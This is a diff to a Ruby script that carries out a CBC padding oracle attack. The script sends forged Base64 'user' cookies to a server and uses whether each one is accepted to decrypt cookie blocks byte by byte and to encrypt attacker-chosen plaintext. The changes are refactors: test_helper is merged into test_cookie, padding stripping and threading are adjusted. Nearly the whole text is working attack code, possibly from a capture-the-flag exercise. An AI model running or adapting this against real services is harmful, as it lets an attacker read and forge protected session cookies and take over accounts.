@@ -8,19 +8,10 @@ def debug(msg)
   $stderr.puts msg
 end
 
+Thread::abort_on_exception = true
+
 module Oracle
   module_function
-
-  def test_cookie(cookie)
-    encoded = Base64.strict_encode64(cookie)
-    begin
-      open(URL, 'Cookie' => "user=\"#{encoded}\"")
-      debug "Server accepts the cookie #{encoded}"
-      true
-    rescue OpenURI::HTTPError
-      false
-    end
-  end
 
   def random_bytes(size)
     Array.new(size) { rand(0xff) }
@@ -30,8 +21,15 @@ module Oracle
     [a.unpack('C*'), b.unpack('C*')].transpose.map { |x| x.reduce(:^) }.pack('C*')
   end
 
-  def test_helper(byte_array, block)
-    test_cookie(byte_array.pack('C*') + block)
+  def test_cookie(byte_array, block)
+    encoded = Base64.strict_encode64(byte_array.pack('C*') + block)
+    begin
+      open(URL, 'Cookie' => "user=\"#{encoded}\"")
+      debug "Server accepts the cookie #{encoded}"
+      true
+    rescue OpenURI::HTTPError
+      false
+    end
   end
 
   def last_word(block)
@@ -41,7 +39,7 @@ module Oracle
     # Find the last byte
     (0..0xff).to_a.shuffle.each do |x|
       r[-1] = x
-      break if test_helper(r, block)
+      break if test_cookie(r, block)
     end
 
     r[-1] ^= 1
@@ -50,7 +48,7 @@ module Oracle
     begin
       decoded.unshift r.pop^1
       r[-1] ^= 1
-    end until test_helper(r.concat(decoded), block)
+    end until test_cookie(r.concat(decoded), block)
 
     decoded[0] ^= decoded.length
 
@@ -68,7 +66,7 @@ module Oracle
 
       (0..0xff).to_a.shuffle.each do |x|
         r[-decoded.length-1] = x
-        break if test_helper(r, block)
+        break if test_cookie(r, block)
       end
 
       decoded.unshift r[-decoded.length-1] ^ (decoded.length+1)
@@ -82,23 +80,23 @@ module Oracle
 
     begin
       attempt.clear
-      Array.new(2) { Thread.new{ attempt.push decrypt_block_helper(block) } }.each(&:join)
+      Array.new(2) { Thread.new{ attempt << decrypt_block_helper(block) } }.each(&:join)
     end until attempt[0] == attempt[1]
 
     attempt[0]
   end
 
   def decrypt(blocks)
-    decrypted = Array.new
-
     debug "#{blocks.length-1} blocks to decrypt"
 
+    decrypted = Array.new
+
     (1..blocks.size-1).each do |b|
-      decrypted.push xor(blocks[b-1], decrypt_block(blocks[b]))
+      decrypted << xor(blocks[b-1], decrypt_block(blocks[b]))
     end
 
     # Strip padding
-    decrypted[-1].rstrip!
+    decrypted[-1].chop! while decrypted[-1].unpack('C*')[-1] == 0
     decrypted[-1].chop!
 
     decrypted
@@ -107,8 +105,7 @@ module Oracle
   def encrypt(blocks)
     debug "#{blocks.length} blocks to encrypt"
 
-    encrypted = Array.new
-    encrypted.unshift random_bytes(BLOCK_SIZE).pack('C*')
+    encrypted = [ random_bytes(BLOCK_SIZE).pack('C*') ]
 
     blocks.reverse_each do |block|
       encrypted.unshift xor(block, decrypt_block(encrypted[0]))
